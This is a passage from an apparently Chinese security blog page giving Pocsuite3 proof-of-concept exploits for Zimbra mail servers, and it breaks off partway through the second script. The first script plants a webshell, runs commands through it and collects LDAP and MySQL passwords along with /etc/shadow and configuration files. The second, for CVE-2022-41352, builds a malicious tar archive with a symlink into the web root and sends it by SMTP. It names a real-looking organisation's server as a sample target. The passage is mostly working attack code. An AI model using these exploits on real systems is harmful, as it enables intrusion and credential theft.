class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">self, command</span>):</span><br><span class="line">        data = &#123;self.webshellPass: command&#125;</span><br><span class="line">        req = requests.post(self.url + <span class="string">&#x27;/zimbraAdmin/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName), data=data, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> req.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">self</span>):</span><br><span class="line">        r = requests.get(self.url, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;</span>)</span><br><span class="line">        url_title = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> url_title[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ldap_and_mysql_Info</span>(<span class="params">self</span>):</span><br><span class="line">        zmlocalconfig = self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmlocalconfig -s&#x27;</span>)</span><br><span class="line">        pattern_email = re.<span class="built_in">compile</span>(<span class="string">&#x27;av_notify_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_password = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ladp_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_url = re.<span class="built_in">compile</span>(<span class="string">&#x27;ldap_url = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_address = re.<span class="built_in">compile</span>(<span class="string">&#x27;mysql_bind_address = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_password = (.*)&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ldap_Pass = re.findall(pattern_ldap_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_user = re.findall(pattern_ladp_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_url = re.findall(pattern_ldap_url, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_address = re.findall(pattern_mysql_address, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_username = re.findall(pattern_mysql_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_Pass = re.findall(pattern_mysql_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            av_notify_user = re.findall(pattern_email, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        self.raw_url = self.url</span><br><span class="line">        self.host = urlparse(self.url).hostname</span><br><span class="line">        self.port = urlparse(self.url).port</span><br><span class="line">        <span class="keyword">if</span> self.port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port = <span class="number">443</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.upload_webshell():</span><br><span class="line">                result[<span class="string">&quot;url&quot;</span>] = self.url</span><br><span class="line"></span><br><span class="line">                ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user = self.get_ldap_and_mysql_Info()</span><br><span class="line">                <span class="comment"># Web网站相关信息</span></span><br><span class="line">                result[<span class="string">&quot;web&quot;</span>] = &#123;</span><br><span class="line">                    <span class="comment"># 网站默认首页的title信息（可能含有单位或组织信息）</span></span><br><span class="line">                    <span class="string">&quot;title&quot;</span>: self.get_title(),</span><br><span class="line">                    <span class="comment">#webshell路径及参数名</span></span><br><span class="line">                    <span class="string">&quot;webshell&quot;</span>: &#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/zimbraAdmin/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName),</span><br><span class="line">                                 <span class="string">&quot;password&quot;</span>: self.webshellPass&#125;,</span><br><span class="line">                    <span class="string">&quot;admin notification emails&quot;</span>: av_notify_user</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment"># 凭据类信息，针对各类弱口令、默认口令漏洞</span></span><br><span class="line">                result[<span class="string">&quot;login_credentials&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: ldap_user, <span class="string">&quot;password&quot;</span>: ldap_Pass, <span class="string">&quot;ldap_url&quot;</span>: ldap_url, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;ldap&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: mysql_username, <span class="string">&quot;password&quot;</span>: mysql_Pass, <span class="string">&quot;mysql_bind_address&quot;</span>: mysql_address, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;mysql&quot;</span>&#125;</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 获取的文件信息, 针对各类文件读取类漏洞</span></span><br><span class="line">                result[<span class="string">&quot;files&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/passwd&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/hosts&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/hosts&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/shadow&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/shadow&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;resolv,conf&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/resolv.conf&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/resolv.conf&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;localconfig.xml&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/opt/zimbra/conf/localconfig.xml&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /opt/zimbra/conf/localconfig.xml&quot;</span>)&#125;,</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 命令执行信息, 针对各类命令执行、代码执行漏洞</span></span><br><span class="line">                result[<span class="string">&quot;commands&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;id&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;whoami&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;arp&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;arp -a&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;ifconfig&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;ifconfig&quot;</span>)&#125;</span><br><span class="line">                ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result.keys()) != <span class="number">0</span>:</span><br><span class="line">            json_result = &#123;</span><br><span class="line">                <span class="string">&quot;result&quot;</span>: &#123;<span class="string">&quot;json&quot;</span>: json.dumps(result)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            output.success(json_result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Internet nothing returned&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(PoC)</span><br></pre></td></tr></table></figure><p>POC运行结果如下：</p><p><a href="https://pic.imgdb.cn/item/642beed46ea21b9a9e5711fd.jpg" title="844315bf-c382-4478-9a91-a3f8bf5e4974" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beed46ea21b9a9e5711fd.jpg" alt="844315bf-c382-4478-9a91-a3f8bf5e4974"></a></p><h2 id="CVE-2022-41352-Zimbra-Unauthenticated-RCE"><a href="#CVE-2022-41352-Zimbra-Unauthenticated-RCE" class="headerlink" title="CVE-2022-41352 Zimbra Unauthenticated RCE"></a>CVE-2022-41352 Zimbra Unauthenticated RCE</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在Zimbra Collaboration（ZCS）8.8.15 和 9.0中，攻击者可以利用cpio漏洞通过amavisd上传任意文件到web目录&#x2F;opt&#x2F;zimbra&#x2F;jetty&#x2F;webapps&#x2F;zimbra&#x2F;public，从而导致未授权远程代码执行。 Zimbra建议用户使用pax代替cpio，虽然安装pax是Ubuntu上安装Zimbra的前提条件，但是在RHEL 6（或CentOS 6）之后，Red Hat发行版不再默认安装pax。</p><h3 id="Pocsuite-POC-2"><a href="#Pocsuite-POC-2" class="headerlink" title="Pocsuite-POC"></a>Pocsuite-POC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> (</span><br><span class="line">    minimum_version_required, POCBase, register_poc, requests, logger,</span><br><span class="line">    OptString, OrderedDict,</span><br><span class="line">    random_str, Output,</span><br><span class="line">    get_listener_ip, get_listener_port, REVERSE_PAYLOAD</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.mime.application <span class="keyword">import</span> MIMEApplication</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PoC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;Zimbra Unauthenticated RCE&#x27;</span></span><br><span class="line">    author = <span class="string">&#x27;rainb0w&#x27;</span></span><br><span class="line">    is0day = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;远程代码执行&#x27;</span></span><br><span class="line">    <span class="comment"># 严重 高危 中危 低危</span></span><br><span class="line">    level = <span class="string">&#x27;验证&#x27;</span></span><br><span class="line">    CVE = <span class="string">&#x27;CVE-2022-41352&#x27;</span></span><br><span class="line">    CNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    CNNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ExploitDB = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Vendor = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appName = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appVersion = [<span class="string">&#x27;Zimbra &lt;9.0.0.p27&#x27;</span>, <span class="string">&#x27;Zimbra &lt;8.8.15.p34&#x27;</span>]</span><br><span class="line">    Tags = []</span><br><span class="line">    search_keyword = <span class="string">&#x27;title:&quot;Zimbra 网络客户端登录&quot;&#x27;</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra是著名的开源系统，提供了一套开源协同办公套件包括WebMail，日历，通信录，Web文档管理和创作。一体化地提供了邮件收发、文件共享、协同办公、即时聊天等一系列解决方案，是开源软件中的精品。</span></span><br><span class="line"><span class="string">    作为邮件服务器系统，Zimbra更是凭借卓越的稳定性和功能当之无愧地成为开源邮件服务器系统的首选，适合各类型/人数的用户群，尤其适合团队使用。</span></span><br><span class="line"><span class="string">    其最大的特色在于其采用Ajax技术模仿CS桌面应用软件的风格开发的客户端兼容Firefox,Safari和IE浏览器。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    details = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在Zimbra Collaboration（ZCS）8.8.15 和 9.0中，攻击者可以利用cpio漏洞通过amavisd上传任意文件到web目录/opt/zimbra/jetty/webapps/zimbra/public，从而导致未授权远程代码执行。</span></span><br><span class="line"><span class="string">    Zimbra建议用户使用pax代替cpio，虽然安装pax是Ubuntu上安装Zimbra的前提条件，但是在RHEL 6（或CentOS 6）之后，Red Hat发行版不再默认安装pax。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    要修复此漏洞，请应用最新的修补程序，或者安装pax并重新启动服务器。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    official_solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P27</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    references = []</span><br><span class="line">    samples = [<span class="string">&#x27;https://mail.realclubdelima.org.pe&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_tar_payload</span>(<span class="params">self, payload, payload_name, payload_path, lnk=<span class="string">&#x27;startup&#x27;</span></span>):</span><br><span class="line">        <span class="comment"># Block 1</span></span><br><span class="line">        link = lnk.encode()</span><br><span class="line">        mode = <span class="string">b&#x27;0000777\x00&#x27;</span>  <span class="comment"># link permissions</span></span><br><span class="line">        ouid = <span class="string">b&#x27;0001745\x00&#x27;</span>  <span class="comment"># octal uid (997)</span></span><br><span class="line">        ogid = <span class="string">b&#x27;0001745\x00&#x27;</span>  <span class="comment"># octal gid</span></span><br><span class="line">        lnsz = <span class="string">b&#x27;00000000000\x00&#x27;</span>  <span class="comment"># file size (link = 0)</span></span><br><span class="line">        lmod = <span class="string">b&#x27;14227770134\x00&#x27;</span>  <span class="comment"># last modified (octal unix)</span></span><br><span class="line">        csum = <span class="string">b&#x27;        &#x27;</span>  <span class="comment"># checksum = 8 blanks</span></span><br><span class="line">        <span class="built_in">type</span> = <span class="string">b&#x27;2&#x27;</span>  <span class="comment"># type (link = 2)</span></span><br><span class="line">        targ = payload_path.encode()  <span class="comment"># link target</span></span><br><span class="line">        magi = <span class="string">b&#x27;ustar  \x00&#x27;</span>  <span class="comment"># ustar magic bytes + version</span></span><br><span class="line">        ownu = <span class="string">b&#x27;zimbra&#x27;</span>  <span class="comment"># user owner</span></span><br><span class="line">        owng = <span class="string">b&#x27;zimbra&#x27;</span>  <span class="comment"># group owner</span></span><br><span class="line">        vers = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span>  <span class="comment"># device major and minor</span></span><br><span class="line">        pref = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">155</span>  <span class="comment"># prefix (only used if the file name length exceeds 100)</span></span><br><span class="line"></span><br><span class="line">        raw_b1_1 = link + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(link)) + mode + ouid + ogid + lnsz + lmod</span><br><span class="line">        raw_b1_2 = <span class="built_in">type</span> + targ + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(targ)) + magi + ownu + <span class="string">b&#x27;\x00&#x27;</span> * (</span><br><span class="line">                    <span class="number">32</span> - <span class="built_in">len</span>(ownu)) + owng + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">32</span> - <span class="built_in">len</span>(owng)) + vers + pref</span><br><span class="line">        <span class="comment"># calculate and insert checksum</span></span><br><span class="line">        csum = <span class="built_in">oct</span>(<span class="built_in">sum</span>(b <span class="keyword">for</span> b <span class="keyword">in</span> raw_b1_1 + csum + raw_b1_2))[<span class="number">2</span>:]</span><br><span class="line">        raw_b1 = raw_b1_1 + <span class="string">f&#x27;<span class="subst">&#123;csum:&gt;07&#125;</span>&#x27;</span>.encode() + <span class="string">b&#x27;\x00&#x27;</span> + raw_b1_2</span><br><span class="line">        <span class="comment"># pad block to 512</span></span><br><span class="line">        raw_b1 += <span class="string">b&#x27;\00&#x27;</span> * (<span class="number">512</span> - <span class="built_in">len</span>(raw_b1))</span><br><span class="line">        <span class="comment"># Block 2</span></span><br><span class="line">        mode = <span class="string">b&#x27;0000644\x00&#x27;</span>  <span class="comment"># file permissions</span></span><br><span class="line">        file = <span class="string">f&#x27;<span class="subst">&#123;lnk&#125;</span>/<span class="subst">&#123;payload_name&#125;</span>&#x27;</span>.encode()</span><br><span class="line">        flsz = <span class="built_in">oct</span>(<span class="built_in">len</span>(payload))[<span class="number">2</span>:]  <span class="comment"># file size</span></span><br><span class="line">        csum = <span class="string">b&#x27;        &#x27;</span>  <span class="comment"># checksum = 8 blanks</span></span><br><span class="line">        <span class="built_in">type</span> = <span class="string">b&#x27;0&#x27;</span>  <span class="comment"># type (file = 0)</span></span><br><span class="line">        targ = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">100</span>  <span class="comment"># link target = none</span></span><br><span class="line"></span><br><span class="line">        raw_b2_1 = file + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(file)) + mode + ouid + ogid + <span class="string">f&#x27;<span class="subst">&#123;flsz:&gt;011&#125;</span>&#x27;</span>.encode() + <span class="string">b&#x27;\x00&#x27;</span> + lmod</span><br><span class="line">        raw_b2_2 = <span class="built_in">type</span> + targ + magi + ownu + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">32</span> - <span class="built_in">len</span>(ownu)) + owng + <span class="string">b&#x27;\x00&#x27;</span> * (</span><br><span class="line">                    <span class="number">32</span> - <span class="built_in">len</span>(owng)) + vers + pref</span><br><span class="line">        <span class="comment"># calculate and insert checksum</span></span><br><span class="line">        csum = <span class="built_in">oct</span>(<span class="built_in">sum</span>(b <span class="keyword">for</span> b <span class="keyword">in</span> raw_b2_1 + csum + raw_b2_2))[<span class="number">2</span>:]</span><br><span class="line">        raw_b2 = raw_b2_1 + <span class="string">f&#x27;<span class="subst">&#123;csum:&gt;07&#125;</span>&#x27;</span>.encode() + <span class="string">b&#x27;\x00&#x27;</span> + raw_b2_2</span><br><span class="line">        <span class="comment"># pad block to 512</span></span><br><span class="line">        raw_b2 += <span class="string">b&#x27;\00&#x27;</span> * (<span class="number">512</span> - <span class="built_in">len</span>(raw_b2))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Assemble</span></span><br><span class="line">        raw_tar = raw_b1 + raw_b2 + payload + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">512</span>-(<span class="built_in">len</span>(payload)%<span class="number">512</span>))</span><br><span class="line"></span><br><span class="line">        raw_tar += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">512</span> * <span class="number">2</span>  <span class="comment"># Trailer: end with 2 empty blocks</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> raw_tar</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">smtp_send_file</span>(<span class="params">self, target, sender, recipient, subject, body, attachment, attachment_name</span>):</span><br><span class="line">        msg = MIMEMultipart()</span><br><span class="line">        msg[<span class="string">&#x27;Subject&#x27;</span>] = subject</span><br><span class="line">        msg[<span class="string">&#x27;From&#x27;</span>] = sender</span><br><span class="line">        msg[<span class="string">&#x27;To&#x27;</span>] = recipient</span><br><span class="line"></span><br><span class="line">        message = MIMEText(body, <span class="string">&#x27;html&#x27;</span>)</span><br><span class="line">        msg.attach(message)</span><br><span class="line"></span><br><span class="line">        att = MIMEApplication(attachment)</span><br><span class="line">        att.add_header(<span class="string">&#x27;Content-Disposition&#x27;</span>, <span class="string">&#x27;attachment&#x27;</span>, filename=attachment_name)</span><br><span class="line">        msg.attach(att)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            smtp_server = smtplib.SMTP(target, <span class="number">25</span>)</span><br><span class="line">            